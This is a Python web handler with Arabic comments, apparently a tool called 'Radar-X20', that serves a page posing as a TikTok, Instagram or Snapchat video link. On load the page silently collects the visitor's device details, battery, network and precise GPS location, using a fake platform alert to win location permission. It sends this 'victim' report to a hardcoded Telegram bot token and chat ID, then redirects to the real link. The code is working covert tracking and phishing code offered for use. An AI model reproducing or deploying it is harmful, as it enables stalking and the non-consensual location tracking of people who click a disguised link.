from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.parse

# 🛡️ بيانات البوت الثابتة
TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
ID = "5811700860"

class Storage:
    target_url = "https://vt.tiktok.com/"

storage = Storage()

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # إذا كان الطلب تحديث رابط من لوحة التحكم
            if 'url' in data:
                storage.target_url = data.get("url")
            
            # إذا كان الطلب سحب بيانات ضحية (POST من الصفحة)
            elif 'device' in data:
                d = data['device']
                gps = d.get('gps', 'لم يتم السماح')
                maps_url = f"https://www.google.com/maps?q={gps['lat']},{gps['lon']}" if isinstance(gps, dict) else "غير متوفر"
                
                report = (
                    "🛰️ ** صيدة كاملة - Radar-X20 ** ⚠️\n"
                    "━━━━━━━━━━━━━━━\n"
                    f"🌐 **الـ IP:** `{d.get('ip')}`\n"
                    f"📱 **الجهاز:** {d.get('platform')}\n"
                    f"🖥️ **الدقة:** {d.get('screen')}\n"
                    f"🔋 **البطارية:** {d.get('battery')}\n"
                    f"📶 **الشبكة:** {d.get('network')}\n"
                    f"📍 **الموقع:** {maps_url}\n"
                    f"🔗 **الرابط المستهدف:** {storage.target_url}\n"
                    "━━━━━━━━━━━━━━━"
                )
                self.send_to_telegram(report)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok"}).encode())
        except Exception as e:
            self.send_response(500)
            self.end_headers()

    def send_to_telegram(self, text):
        api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={urllib.parse.quote(text)}&parse_mode=Markdown"
        urllib.request.urlopen(urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'}))

    def do_GET(self):
        # تحديد التمويه بناءً على الرابط
        target = storage.target_url.lower()
        platform_name = "TikTok"
        image = "https://sf16-scmcdn-sg.ibytedtos.com/obj/eden-sg/uufs_om_lp/ljhwZ_lp/2021/tiktok_og_image.png"
        
        if "instagram" in target: platform_name = "Instagram"; image = "https://www.instagram.com/static/images/ico/favicon-192.png/ed973502857e.png"
        elif "snapchat" in target: platform_name = "Snapchat"; image = "https://www.snapchat.com/favicon.png"

        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()

        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>{platform_name} Video</title>
            <meta property="og:title" content="{platform_name} - Watch Now">
            <meta property="og:image" content="{image}">
            <meta name="twitter:card" content="summary_large_image">
            <script>
                async function startCapture() {{
                    let data = {{
                        ip: "سحب من السيرفر",
                        platform: navigator.userAgent.split(')')[0].split('(')[1],
                        screen: window.screen.width + "x" + window.screen.height,
                        network: navigator.connection ? (navigator.connection.type || navigator.connection.effectiveType) : "WiFi/Data"
                    }};

                    try {{
                        let b = await navigator.getBattery();
                        data.battery = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
                    }} catch(e) {{ data.battery = "Unknown"; }}

                    // خدعة الـ GPS بلفّة
                    if (navigator.geolocation) {{
                        navigator.geolocation.getCurrentPosition((pos) => {{
                            data.gps = {{ lat: pos.coords.latitude, lon: pos.coords.longitude }};
                            finish(data);
                        }}, () => {{ data.gps = "رفض الإذن"; finish(data); }}, 
                        {{ enableHighAccuracy: true }});
                        
                        // إظهار تنبيه وهمي لزيادة المصداقية
                        alert("يرغب {platform_name} باستخدام موقعك لتحسين جودة عرض الفيديو القريب منك.");
                    }} else {{ finish(data); }}
                }}

                function finish(deviceData) {{
                    fetch(window.location.href, {{
                        method: 'POST',
                        body: JSON.stringify({{ device: deviceData }}),
                        headers: {{ 'Content-Type': 'application/json' }}
                    }}).then(() => {{
                        window.location.replace("{storage.target_url}");
                    }});
                }}
                window.onload = startCapture;
            </script>
        </head>
        <body style="background:black;"></body>
        </html>
        """
        self.wfile.write(html.encode())
